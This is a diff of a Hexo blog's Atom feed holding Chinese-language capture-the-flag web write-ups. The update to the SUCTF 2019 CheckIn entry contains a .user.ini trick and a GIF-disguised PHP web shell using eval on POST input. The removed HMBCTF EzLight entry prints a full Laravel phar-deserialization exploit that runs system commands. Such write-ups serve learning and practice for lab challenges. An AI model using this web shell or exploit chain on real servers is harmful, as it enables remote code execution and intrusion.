@@ -6,7 +6,7 @@
   <link href="http://haorical.xyz/atom.xml" rel="self"/>
   
   <link href="http://haorical.xyz/"/>
-  <updated>2021-10-17T15:05:21.503Z</updated>
+  <updated>2021-10-18T13:28:06.378Z</updated>
   <id>http://haorical.xyz/</id>
   
   <author>
@@ -17,11 +17,37 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>20211018</title>
+    <link href="http://haorical.xyz/posts/5df9dcd3/"/>
+    <id>http://haorical.xyz/posts/5df9dcd3/</id>
+    <published>2021-10-18T13:27:21.000Z</published>
+    <updated>2021-10-18T13:28:06.378Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Mark-loves-cat&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Mark-loves-cat&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Mark loves cat&quot;&gt;&lt;/a&gt;[BJDCTF202</summary>
+      
+    
+    
+    
+    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    
+    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
+    
+    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>20211017</title>
     <link href="http://haorical.xyz/posts/cd46c142/"/>
     <id>http://haorical.xyz/posts/cd46c142/</id>
     <published>2021-10-17T13:31:05.000Z</published>
-    <updated>2021-10-17T15:05:21.503Z</updated>
+    <updated>2021-10-18T13:25:57.370Z</updated>
     
     <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p><p>先上传user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure><p>然后上传图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问路径下的index.php，让它自动加载马</p><p>蚁剑或者直接cat flag</p><p>一会儿在本地测试一下</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5的一些基操</p>]]></content>
     
@@ -532,34 +558,6 @@
     <category term="web" scheme="http://haorical.xyz/tags/web/"/>
     
     <category term="rce" scheme="http://haorical.xyz/tags/rce/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>20210830</title>
-    <link href="http://haorical.xyz/posts/d7bb00be/"/>
-    <id>http://haorical.xyz/posts/d7bb00be/</id>
-    <published>2021-08-30T06:14:15.000Z</published>
-    <updated>2021-08-30T08:27:00.798Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="HMBCTF-2021-EzLight"><a href="#HMBCTF-2021-EzLight" class="headerlink" title="[HMBCTF 2021]EzLight"></a>[HMBCTF 2021]EzLight</h1><p>先下载源码，本地搭建一下环境，我这出了点问题了，一直显示服务器内部错误。</p><p>百度得知lightcms有rce漏洞，在source中查找发现可以</p><p>参考<a href="https://igml.top/2021/05/10/lightcms-RCE/">https://igml.top/2021/05/10/lightcms-RCE/</a></p><p>在本地中跟了一下</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830143736.png"></p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830143705.png"></p><p>跟进fetchImageFile</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830144048.png"></p><p>跟进make</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830144514.png"></p><p>找到file_get_contents()</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210830144657.png"></p><p>利用phar反序列化，这个也是才学的，还挺好玩，看了一下larvel的pop链，发现可以利用，参考<a href="https://www.anquanke.com/post/id/231079">https://www.anquanke.com/post/id/231079</a></p><p>生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">      <span class="keyword">protected</span> <span class="variable">$connection</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $command = new Illuminate\Broadcasting\BroadcastEvent(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dispater</span> = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$PendingBroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$dispater</span>,<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$PendingBroadcast</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中途靶机过期，懵逼</p><p>将 phar 上传得到路径 </p><pre><code>upload/image/202108/zz8bZRfp7OV5lfPz3EJs1LyXZpWaXWfFsfgGSAiQ.gif </code></pre><p>在自己的服务器上上传一个txt,内容</p><pre><code>phar://./upload/image/202108/zz8bZRfp7OV5lfPz3EJs1LyXZpWaXWfFsfgGSAiQ.gif </code></pre><p>利用刚才的触发点，直接post传参</p><pre><code>file=https://haorical.xyz/heihei.txt</code></pre><p>得到flag</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;HMBCTF-2021-EzLight&quot;&gt;&lt;a href=&quot;#HMBCTF-2021-EzLight&quot; class=&quot;headerlink&quot; title=&quot;[HMBCTF 2021]EzLight&quot;&gt;&lt;/a&gt;[HMBCTF 2021]EzLight&lt;/h1&gt;&lt;p&gt;</summary>
-      
-    
-    
-    
-    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
-    
-    
-    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
-    
-    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
-    
-    <category term="反序列化" scheme="http://haorical.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
   </entry>
   
